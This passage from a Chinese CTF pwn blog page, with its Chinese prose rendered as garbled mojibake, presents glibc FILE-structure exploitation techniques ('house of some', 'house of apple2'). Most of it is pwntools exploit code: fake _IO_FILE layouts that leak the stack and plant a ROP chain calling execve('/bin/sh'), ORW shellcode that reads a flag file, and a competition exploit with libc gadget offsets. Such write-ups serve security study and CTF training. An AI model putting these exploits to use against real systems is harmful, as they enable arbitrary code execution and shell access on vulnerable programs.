class="string">b&quot;\x00&quot;</span>)</span><br></pre></td></tr></table></figure><p>Csomeçš„è‡ªåŠ¨åŒ–è„šæœ¬:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="comment"># context.arch = &quot;amd64&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">HouseOfSome</span>:</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, libc: ELF, controled_addr</span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">        self.libc = libc</span><br><span class="line">        self.controled_addr =controled_addr</span><br><span class="line">        self.READ_LENGTH_DEFAULT = <span class="number">0x400</span></span><br><span class="line">        self.LEAK_LENGTH = <span class="number">0x500</span></span><br><span class="line"></span><br><span class="line">        self.fake_wide_data_template = <span class="keyword">lambda</span> : flat(&#123;</span><br><span class="line">            <span class="number">0x18</span>: <span class="number">0</span>,</span><br><span class="line">            <span class="number">0x20</span>: <span class="number">1</span>,</span><br><span class="line">            <span class="number">0x30</span>: <span class="number">0</span>,</span><br><span class="line">            <span class="number">0xE0</span>: self.libc.symbols[<span class="string">&#x27;_IO_file_jumps&#x27;</span>] - <span class="number">0x48</span>,</span><br><span class="line">        &#125;, filler=<span class="string">b&quot;\x00&quot;</span>)</span><br><span class="line"></span><br><span class="line">        self.fake_file_read_template = <span class="keyword">lambda</span> buf_start, buf_end, wide_data, chain, fileno: flat(&#123;</span><br><span class="line">            <span class="number">0x00</span>: <span class="number">0</span>, <span class="comment"># _flags</span></span><br><span class="line">            <span class="number">0x20</span>: <span class="number">0</span>, <span class="comment"># _IO_write_base</span></span><br><span class="line">            <span class="number">0x28</span>: <span class="number">0</span>, <span class="comment"># _IO_write_ptr</span></span><br><span class="line">            </span><br><span class="line">            <span class="number">0x38</span>: buf_start, <span class="comment"># _IO_buf_base</span></span><br><span class="line">            <span class="number">0x40</span>: buf_end, <span class="comment"># _IO_buf_end</span></span><br><span class="line">            <span class="number">0x68</span>: chain, <span class="comment"># _chain</span></span><br><span class="line">            </span><br><span class="line">            <span class="number">0x70</span>: p32(fileno), <span class="comment"># _fileno</span></span><br><span class="line">            <span class="number">0x82</span>: <span class="string">b&quot;\x00&quot;</span>, <span class="comment"># _vtable_offset</span></span><br><span class="line">            <span class="number">0xa0</span>: wide_data, <span class="comment"># _wide_data</span></span><br><span class="line">            <span class="number">0xc0</span>: <span class="number">2</span>, <span class="comment"># _mode</span></span><br><span class="line">            <span class="number">0xd8</span>: self.libc.symbols[<span class="string">&#x27;_IO_wfile_jumps&#x27;</span>], <span class="comment"># vtable</span></span><br><span class="line">        &#125;, filler=<span class="string">b&quot;\x00&quot;</span>)</span><br><span class="line"></span><br><span class="line">        self.fake_file_write_template = <span class="keyword">lambda</span> buf_start, buf_end, chain, fileno: flat(&#123;</span><br><span class="line">            <span class="number">0x00</span>: <span class="number">0x800</span> | <span class="number">0x1000</span>, <span class="comment"># _flags</span></span><br><span class="line">            </span><br><span class="line">            <span class="number">0x20</span>: buf_start, <span class="comment"># _IO_write_base</span></span><br><span class="line">            <span class="number">0x28</span>: buf_end, <span class="comment"># _IO_write_ptr</span></span><br><span class="line"></span><br><span class="line">            <span class="number">0x68</span>: chain, <span class="comment"># _chain</span></span><br><span class="line">            <span class="number">0x70</span>: p32(fileno), <span class="comment"># _fileno</span></span><br><span class="line">            <span class="number">0xd8</span>: self.libc.symbols[<span class="string">&#x27;_IO_file_jumps&#x27;</span>], <span class="comment"># vtable</span></span><br><span class="line">        &#125;, filler=<span class="string">b&quot;\x00&quot;</span>)</span><br><span class="line"></span><br><span class="line">        self.wide_data_length = <span class="built_in">len</span>(self.fake_wide_data_template())</span><br><span class="line">        self.read_file_length = <span class="built_in">len</span>(self.fake_file_read_template(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>))</span><br><span class="line">        self.write_file_length = <span class="built_in">len</span>(self.fake_file_write_template(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">next_control_addr</span>(<span class="params">self, addr, <span class="built_in">len</span></span>):</span><br><span class="line">        <span class="keyword">return</span> addr + <span class="built_in">len</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">read</span>(<span class="params">self, fd, buf, <span class="built_in">len</span></span>):</span><br><span class="line">        addr = self.controled_addr</span><br><span class="line">        f_read_file_0 = self.fake_file_read_template(buf, buf+<span class="built_in">len</span>, addr+self.read_file_length, addr+self.read_file_length+self.wide_data_length, fd) </span><br><span class="line">        f_wide_data = self.fake_wide_data_template()</span><br><span class="line">        addr += self.read_file_length + self.wide_data_length</span><br><span class="line">        self.controled_addr = self.next_control_addr(self.controled_addr, (self.read_file_length+self.wide_data_length) * <span class="number">2</span>)</span><br><span class="line">        f_read_file_1 = self.fake_file_read_template(self.controled_addr, self.controled_addr+self.READ_LENGTH_DEFAULT, addr+self.read_file_length, self.controled_addr, <span class="number">0</span>) </span><br><span class="line">        </span><br><span class="line">        payload = flat([</span><br><span class="line">            f_read_file_0,</span><br><span class="line">            f_wide_data,</span><br><span class="line">            f_read_file_1,</span><br><span class="line">            f_wide_data</span><br><span class="line">        ])</span><br><span class="line">        <span class="keyword">assert</span> <span class="string">b&quot;\n&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> payload, <span class="string">&quot;\\n in payload.&quot;</span></span><br><span class="line">        <span class="keyword">return</span> payload</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">write</span>(<span class="params">self, fd, buf, <span class="built_in">len</span></span>):</span><br><span class="line">        addr = self.controled_addr</span><br><span class="line">        f_write_file = self.fake_file_write_template(buf, buf+<span class="built_in">len</span>, addr+self.write_file_length, fd) </span><br><span class="line">        addr += self.write_file_length</span><br><span class="line">        f_wide_data = self.fake_wide_data_template()</span><br><span class="line">        self.controled_addr = self.next_control_addr(self.controled_addr, self.read_file_length+self.wide_data_length + self.write_file_length)</span><br><span class="line">        f_read_file_1 = self.fake_file_read_template(self.controled_addr, self.controled_addr+self.READ_LENGTH_DEFAULT, addr+self.read_file_length, self.controled_addr, <span class="number">0</span>) </span><br><span class="line">        </span><br><span class="line">        payload = flat([</span><br><span class="line">            f_write_file,</span><br><span class="line">            f_read_file_1,</span><br><span class="line">            f_wide_data</span><br><span class="line">        ])</span><br><span class="line">        <span class="keyword">assert</span> <span class="string">b&quot;\n&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> payload, <span class="string">&quot;\\n in payload.&quot;</span></span><br><span class="line">        <span class="keyword">return</span> payload</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">bomb</span>(<span class="params">self, io: tube, retn_addr</span>):</span><br><span class="line">        payload = self.write(<span class="number">1</span>, self.libc.symbols[<span class="string">&#x27;_environ&#x27;</span>], <span class="number">0x8</span>)</span><br><span class="line">        p.sendline(payload)</span><br><span class="line">        stack_leak = u64(p.recv(<span class="number">8</span>).ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">        log.success(<span class="string">f&quot;stack_leak : <span class="subst">&#123;stack_leak:#x&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">        payload = self.write(<span class="number">1</span>, stack_leak - self.LEAK_LENGTH, self.LEAK_LENGTH)</span><br><span class="line">        p.sendline(payload)</span><br><span class="line">        <span class="comment"># retn_addr = self.libc.symbols[&#x27;_IO_file_underflow&#x27;] + 390</span></span><br><span class="line">        log.success(<span class="string">f&quot;retn_addr : <span class="subst">&#123;retn_addr:#x&#125;</span>&quot;</span>)</span><br><span class="line">        buf = p.recv(self.LEAK_LENGTH)</span><br><span class="line">        offset = buf.find(p64(retn_addr))</span><br><span class="line">        log.success(<span class="string">f&quot;offset : <span class="subst">&#123;offset:#x&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">        payload = self.read(<span class="number">0</span>, stack_leak - self.LEAK_LENGTH + offset, <span class="number">0x300</span>)</span><br><span class="line">        p.sendline(payload)</span><br><span class="line"></span><br><span class="line">        rop = ROP(self.libc)</span><br><span class="line">        rop.base = stack_leak - self.LEAK_LENGTH + offset</span><br><span class="line">        rop.call(<span class="string">&#x27;execve&#x27;</span>, [<span class="string">b&#x27;/bin/sh&#x27;</span>, <span class="number">0</span>, <span class="number">0</span>])</span><br><span class="line">        log.info(rop.dump())</span><br><span class="line">        rop_chain = rop.chain()</span><br><span class="line">        <span class="keyword">assert</span> <span class="string">b&quot;\n&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> rop_chain, <span class="string">&quot;\\n in rop_chain&quot;</span></span><br><span class="line">        p.sendline(rop_chain)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="comment"># libc = ELF(&quot;./libc-2.38.so.6&quot;)</span></span><br><span class="line">    context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">    libc = ELF(<span class="string">&quot;./libc.so.6&quot;</span>, checksec=<span class="literal">None</span>)</span><br><span class="line">    <span class="comment"># libc.address = 0x100000000000</span></span><br><span class="line">    <span class="comment"># print(hex(libc.bss()))</span></span><br><span class="line">    <span class="comment"># print(libc.maps)</span></span><br><span class="line">    <span class="comment"># for k, v in libc.symbols.items():</span></span><br><span class="line">    <span class="comment">#     print(k, hex(v))</span></span><br><span class="line">    code = libc.read(libc.symbols[<span class="string">&#x27;_IO_file_underflow&#x27;</span>], <span class="number">0x200</span>)</span><br><span class="line">    <span class="built_in">print</span>(code)</span><br><span class="line">    tmp = disasm(code)</span><br><span class="line">    <span class="built_in">print</span>(tmp)</span><br></pre></td></tr></table></figure><p>åœ¨ç¼–å†™<code>exp</code>æ—¶ï¼Œåªéœ€é€šè¿‡<code>from House_of_some import HouseOfSome</code>å°†è¯¥åŒ…å¯¼å…¥å³å¯</p><h3 id="house-of-banana"><a href="#house-of-banana" class="headerlink" title="house of banana"></a>house of banana</h3><p>ğŸŒğŸŒğŸŒğŸŒğŸŒğŸŒğŸŒğŸŒğŸŒğŸŒğŸŒğŸŒğŸŒ  </p><h3 id="é€šè¿‡putså‡½æ•°æ¥è§¦å‘IOé“¾"><a href="#é€šè¿‡putså‡½æ•°æ¥è§¦å‘IOé“¾" class="headerlink" title="é€šè¿‡putså‡½æ•°æ¥è§¦å‘IOé“¾"></a>é€šè¿‡putså‡½æ•°æ¥è§¦å‘IOé“¾</h3><p>é€šè¿‡æºç æˆ‘ä»¬å¯ä»¥å‘ç°ï¼Œ<code>puts</code>å‡½æ•°åœ¨å¯ç”¨æ—¶ä¼šè°ƒç”¨è™šè¡¨ä¸­çš„<code>_IO_wfile_xsputn</code>å‡½æ•°ï¼Œå› æ­¤è¿™é‡Œç»™äº†æˆ‘ä»¬æœºä¼šæ¥ä¿®æ”¹è™šè¡¨åç§»æ¥è§¦å‘<code>io</code>é“¾<br>æˆ‘ä»¬å¯ä»¥å°†<code>fake_file</code>ç›´æ¥å†™åœ¨<code>_IO_2_1_stdout_</code>çš„ä½ç½®ä¸Šé¢æˆ–è€…ä¿®æ”¹<code>stdout</code>æŒ‡é’ˆæŒ‡å‘æˆ‘ä»¬çš„<code>fake_file</code><br>é¦–å…ˆæ˜¯ç”¨äº<code>getshell</code>çš„<code>house of apple2</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">fake_file = flat(&#123;</span><br><span class="line">    <span class="number">0x0</span>: <span class="string">b&#x27;  sh;&#x27;</span>,</span><br><span class="line">    <span class="number">0x8</span>: libc.symbols[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>] - <span class="number">0x10</span>,</span><br><span class="line">    <span class="number">0x28</span>: libc.symbols[<span class="string">&#x27;system&#x27;</span>],</span><br><span class="line"></span><br><span class="line">    <span class="number">0x88</span>: libc.symbols[<span class="string">&#x27;_environ&#x27;</span>]-<span class="number">0x10</span>,</span><br><span class="line">    <span class="number">0xa0</span>: libc.symbols[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>] - <span class="number">0x40</span>,</span><br><span class="line">    <span class="number">0xd8</span>: libc.symbols[<span class="string">&#x27;_IO_wfile_jumps&#x27;</span>] - <span class="number">0x20</span>,</span><br><span class="line">&#125;, filler=<span class="string">b&quot;\x00&quot;</span>)  </span><br></pre></td></tr></table></figure><p>ç„¶åæ˜¯ç”¨äºæ‰“<code>orw</code>çš„<code>house of apple2</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">fake_file = flat(&#123;</span><br><span class="line">    <span class="number">0x8</span>: libc.symbols[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>] - <span class="number">0x10</span>,</span><br><span class="line">    <span class="number">0x10</span>: setcontext,</span><br><span class="line">    <span class="number">0x20</span>: <span class="number">0</span>,</span><br><span class="line">    <span class="number">0x28</span>: pcop,</span><br><span class="line"></span><br><span class="line">    <span class="number">0x58</span>: libc.symbols[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>] &amp; (~<span class="number">0xfff</span>),    <span class="comment"># set rdi</span></span><br><span class="line">    <span class="number">0x60</span>: <span class="number">0x1000</span>,               <span class="comment"># set rsi</span></span><br><span class="line">    <span class="number">0x78</span>: <span class="number">7</span>,                    <span class="comment"># set rdx</span></span><br><span class="line">    <span class="number">0x90</span>: libc.symbols[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>]+<span class="number">0xf0</span>,          <span class="comment"># set rsp</span></span><br><span class="line">    <span class="number">0x98</span>: libc.symbols[<span class="string">&#x27;mprotect&#x27;</span>],             <span class="comment"># set rcx (first jmp)</span></span><br><span class="line"></span><br><span class="line">    <span class="number">0x88</span>: libc.symbols[<span class="string">&#x27;_environ&#x27;</span>]-<span class="number">0x10</span>,</span><br><span class="line">    <span class="number">0xa0</span>: libc.symbols[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>] - <span class="number">0x40</span>,</span><br><span class="line">    <span class="number">0xd8</span>: libc.symbols[<span class="string">&#x27;_IO_wfile_jumps&#x27;</span>] - <span class="number">0x20</span>,</span><br><span class="line"></span><br><span class="line">    <span class="number">0xe8</span>: libc.symbols[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>],</span><br><span class="line"></span><br><span class="line">    <span class="number">0xf0</span>: [                     <span class="comment"># ROPstart</span></span><br><span class="line">        pop_rax_call_rax,</span><br><span class="line">        libc.symbols[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>]+<span class="number">0x100</span>,</span><br><span class="line">    ],</span><br><span class="line">    <span class="number">0x100</span>: asm(    <span class="comment"># shellcode start</span></span><br><span class="line"><span class="string">f&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">push 0x67616c66</span></span><br><span class="line"><span class="string">mov rdi,rsp</span></span><br><span class="line"><span class="string">xor esi,esi</span></span><br><span class="line"><span class="string">push 2</span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">mov rdi,rax</span></span><br><span class="line"><span class="string">mov rsi,rsp</span></span><br><span class="line"><span class="string">mov edx,0x100</span></span><br><span class="line"><span class="string">xor eax,eax</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">mov edi,1</span></span><br><span class="line"><span class="string">mov rsi,rsp</span></span><br><span class="line"><span class="string">push 1</span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string">syscall     </span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>)</span><br><span class="line">&#125;, filler=<span class="string">b&quot;\x00&quot;</span>)</span><br></pre></td></tr></table></figure><h3 id="house-of-someæ”¹è¿›ç‰ˆ"><a href="#house-of-someæ”¹è¿›ç‰ˆ" class="headerlink" title="house of someæ”¹è¿›ç‰ˆ"></a>house of someæ”¹è¿›ç‰ˆ</h3><p>è¿™é‡Œå°±è´´æŸæ¬¡æ¯”èµ›çš„<code>exp</code>ï¼Œä¼˜ç‚¹æ˜¯å¯ä»¥ä¸æ³„éœ²å †åœ°å€</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line">fake_io_read = flat(&#123;</span><br><span class="line">    <span class="number">0x0</span>: <span class="number">0x8000</span> | <span class="number">0x40</span> | <span class="number">0x1000</span>, <span class="comment">#_flags</span></span><br><span class="line">    <span class="number">0x20</span>: heap_base + <span class="number">0x5000</span>, <span class="comment">#_IO_write_base</span></span><br><span class="line">    <span class="number">0x28</span>: heap_base + <span class="number">0x5000</span> + <span class="number">0x500</span>, <span class="comment">#_IO_write_ptr</span></span><br><span class="line">    <span class="number">0x68</span>: heap_base + <span class="number">0x5000</span>, <span class="comment">#_chain</span></span><br><span class="line">    <span class="number">0x70</span>: <span class="number">0</span>, <span class="comment"># _fileno</span></span><br><span class="line">    <span class="number">0xc0</span>: <span class="number">0</span>, <span class="comment">#_modes</span></span><br><span class="line">    <span class="number">0xd8</span>: libc_base + libc.symbols[<span class="string">&#x27;_IO_file_jumps&#x27;</span>] - <span class="number">0x8</span>, <span class="comment">#_vtables</span></span><br><span class="line">&#125;, filler=<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,fake_io_read)</span><br><span class="line">bye()</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;conversation&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;&quot;</span></span><br><span class="line">fake_io_write = flat(&#123;</span><br><span class="line">    <span class="number">0x00</span>: <span class="number">0x8000</span> | <span class="number">0x800</span> | <span class="number">0x1000</span>, <span class="comment">#_flags</span></span><br><span class="line">    <span class="number">0x20</span>: libc_base+libc.symbols[<span class="string">&quot;environ&quot;</span>], <span class="comment">#_IO_write_base</span></span><br><span class="line">    <span class="number">0x28</span>: libc_base+libc.symbols[<span class="string">&quot;environ&quot;</span>] + <span class="number">8</span>, <span class="comment">#_IO_write_ptr</span></span><br><span class="line">    <span class="number">0x68</span>: heap_base + <span class="number">0x5000</span> + <span class="number">0x100</span>, <span class="comment">#_chain</span></span><br><span class="line">    <span class="number">0x70</span>: <span class="number">1</span>, <span class="comment"># _fileno</span></span><br><span class="line">    <span class="number">0xc0</span>: <span class="number">0</span>, <span class="comment">#_modes</span></span><br><span class="line">    <span class="number">0xd8</span>: libc_base + libc.symbols[<span class="string">&#x27;_IO_file_jumps&#x27;</span>], <span class="comment">#_vtables</span></span><br><span class="line">&#125;, filler=<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload = fake_io_write.ljust(<span class="number">0x100</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">fake_io_read = flat(&#123;</span><br><span class="line">    <span class="number">0x00</span>: <span class="number">0x8000</span> | <span class="number">0x40</span> | <span class="number">0x1000</span>, <span class="comment">#_flags</span></span><br><span class="line">    <span class="number">0x20</span>: heap_base + <span class="number">0x5000</span> + <span class="number">0x200</span>, <span class="comment">#_IO_write_base</span></span><br><span class="line">    <span class="number">0x28</span>: heap_base + <span class="number">0x5000</span> + <span class="number">0x500</span>, <span class="comment">#_IO_write_ptr</span></span><br><span class="line">    <span class="number">0x68</span>: heap_base + <span class="number">0x5000</span> + <span class="number">0x200</span>, <span class="comment">#_chain</span></span><br><span class="line">    <span class="number">0x70</span>: <span class="number">0</span>, <span class="comment"># _fileno</span></span><br><span class="line">    <span class="number">0xc0</span>: <span class="number">0</span>, <span class="comment">#_modes</span></span><br><span class="line">    <span class="number">0xd8</span>: libc_base + libc.symbols[<span class="string">&#x27;_IO_file_jumps&#x27;</span>] - <span class="number">0x8</span>, <span class="comment">#_vtables</span></span><br><span class="line">&#125;, filler=<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += fake_io_read.ljust(<span class="number">0x100</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">stack = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">target = stack - <span class="number">648</span></span><br><span class="line">log.success(<span class="string">f&#x27;target:<span class="subst">&#123;target:#x&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line">fake_io_read = flat(&#123;</span><br><span class="line">    <span class="number">0x00</span>: <span class="number">0x8000</span> | <span class="number">0x40</span> | <span class="number">0x1000</span>, <span class="comment">#_flags</span></span><br><span class="line">    <span class="number">0x20</span>: target, <span class="comment">#_IO_write_base</span></span><br><span class="line">    <span class="number">0x28</span>: target + <span class="number">0x200</span>, <span class="comment">#_IO_write_ptr</span></span><br><span class="line">    <span class="number">0x68</span>: <span class="number">0</span>, <span class="comment">#_chain</span></span><br><span class="line">    <span class="number">0x70</span>: <span class="number">0</span>, <span class="comment"># _fileno</span></span><br><span class="line">    <span class="number">0xc0</span>: <span class="number">0</span>, <span class="comment">#_modes</span></span><br><span class="line">    <span class="number">0xd8</span>: libc_base + libc.symbols[<span class="string">&#x27;_IO_file_jumps&#x27;</span>] - <span class="number">0x8</span>, <span class="comment">#_vtables</span></span><br><span class="line">&#125;, filler=<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">p.send(fake_io_read)</span><br><span class="line"></span><br><span class="line">pop_rdi_ret = libc_base + <span class="number">0x0000000000023b6a</span></span><br><span class="line">pop_rsi_ret = libc_base + <span class="number">0x000000000002601f</span></span><br><span class="line">pop_rdx_rbx_ret = libc_base + <span class="number">0x000000000015f8c6</span></span><br><span class="line">pop_rax_ret = libc_base + <span class="number">0x0000000000036174</span></span><br><span class="line">syscall_ret = libc_base + <span class="number">0x00000000000630a9</span></span><br><span class="line"></span><br><span class="line">payload = flat([</span><br><span class="line">    pop_rax_ret, <span class="number">2</span>,</span><br><span class="line">    pop_rax_ret, <span class="number">2</span>,</span><br><span class="line">    pop_rdi_ret, target + <span class="number">0xc0</span>,</span><br><span class="line">    pop_rsi_ret, <span class="number">0</span>,</span><br><span class="line">    syscall_ret,</span><br><span class="line"></span><br><span class="line">    pop_rax_ret, <span class="number">0</span>,</span><br><span class="line">    pop_rdi_ret, <span class="number">3</span>,</span><br><span class="line">    pop_rsi_ret, target + <span class="number">0x150</span>,</span><br><span class="line">    pop_rdx_rbx_ret, <span class="number">0x30</span>,<span class="number">0</span>,</span><br><span class="line">    syscall_ret,</span><br><span class="line"></span><br><span class="line">    pop_rax_ret, <span class="number">1</span>,</span><br><span class="line">    pop_rdi_ret, <span class="number">1</span>,</span><br><span class="line">    syscall_ret,</span><br><span class="line">    <span class="string">b&quot;flag\x00\x00\x00\x00&quot;</span></span><br><span class="line">])</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">p.send(payload)</span><br></pre></td></tr></table></figure><h3 id="house-of-some2"><a href="#house-of-some2" class="headerlink" title="house of some2"></a>house of some2</h3><p>åŸæ–‡é“¾æ¥ï¼š<a href="https://blog.csome.cc/p/house-of-some-2/">https://blog.csome.cc/p/house-of-some-2/</a> åªèƒ½è¯´éå¸¸çš„æš´åŠ›</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span 